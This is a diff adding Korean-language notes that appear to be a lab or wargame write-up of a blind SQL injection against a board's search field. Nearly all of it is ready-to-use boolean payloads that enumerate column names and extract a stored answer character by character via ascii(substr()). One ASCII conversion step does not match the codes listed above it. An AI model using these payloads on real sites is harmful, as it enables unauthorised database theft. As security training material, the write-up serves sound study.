@@ -1,0 +1,53 @@
+1. 쿼리문 유추
+select * from 자유게시판 where 제목 like '%_검색_%' (대소문자 구분 O)
+
+2. 공격 포인트
+    hhhh' -> 검색했는데 오류가 발생했다고 나온다.
+    _검색_ : hh' 
+    hhhh%' and 123=123 and '%'=' # 참이 나옴
+    hhhh%' and 123=321 and '%'=' # 에러가 뜸(게시글이 나오지 않음)
+    검색 쿼리: hhhh%' and _공격쿼리_ and '%'='
+
+[INFO] DB명 INF6, 테이블명 ANSWER
+3. 컬럼명
+select column_name from cols where table_name='ANSWER'
+    3-0. 컬럼 개수 찾기:5개 (1개 컬럼값만 찾음)
+        select count(column_name) from cols where table_name='ANSWER'
+        > hhhh%' and (select count(column_name) from cols where table_name='ANSWER')>0 and '%'='
+    3-1 컬럼명 길이 찾기: 6
+        (select length(cn) from (select rownum as ln, column_name as cn from cols where table_name='ANSWER') where ln=1)
+        > hhhh%' and (select length(cn) from (select rownum as ln, column_name as cn from cols where table_name='ANSWER') where ln=1)>0 and '%'='
+    3-2. 컬럼명 찾기: 65 78 83 87 69 82
+        (select ascii(substr(cn,1,1)) from (select rownum as ln, column_name as cn from cols where table_name='ANSWER') where ln=1)
+        > hhhh%' and ((select ascii(substr(cn,1,1)) from (select rownum as ln, column_name as cn from cols where table_name='ANSWER') where ln=1)>0) and '%'='
+    3-3. 파이썬으로 아스키->문자 바꾸기
+        >>> chr(65)
+        'A'
+        >>> chr(78)
+        'N'
+        >>> chr(82)
+        'R'
+        >>> chr(87)
+        'W'
+        >>> chr(69)
+        'E'
+        >>> chr(82)
+        'R'
+
+4. 컬럼 내 데이터 찾기
+    select answer from (select answer, rownum as rn from answer) where rn=1
+    4-1. 데이터 길이 찾기: 4
+        select length(answer) from (select answer, rownum as rn from answer) where rn=1
+        > hhhh%' and (select length(answer) from (select answer, rownum as rn from answer) where rn=1)>0 and '%'='
+    4-2. 데이터 탈취: 97 110 116 54
+        select ascii(substr(answer,1,1)) from (select answer, rownum as rn from answer) where rn=1
+        > hhhh%' and (select ascii(substr(answer,1,1)) from (select answer, rownum as rn from answer) where rn=1)>0 and '%'='
+        >>> chr(97)
+        'a'
+        >>> chr(110)
+        'n'
+        >>> chr(116)
+        't'
+        >>> chr(54)
+        '6'
+[답] ant6
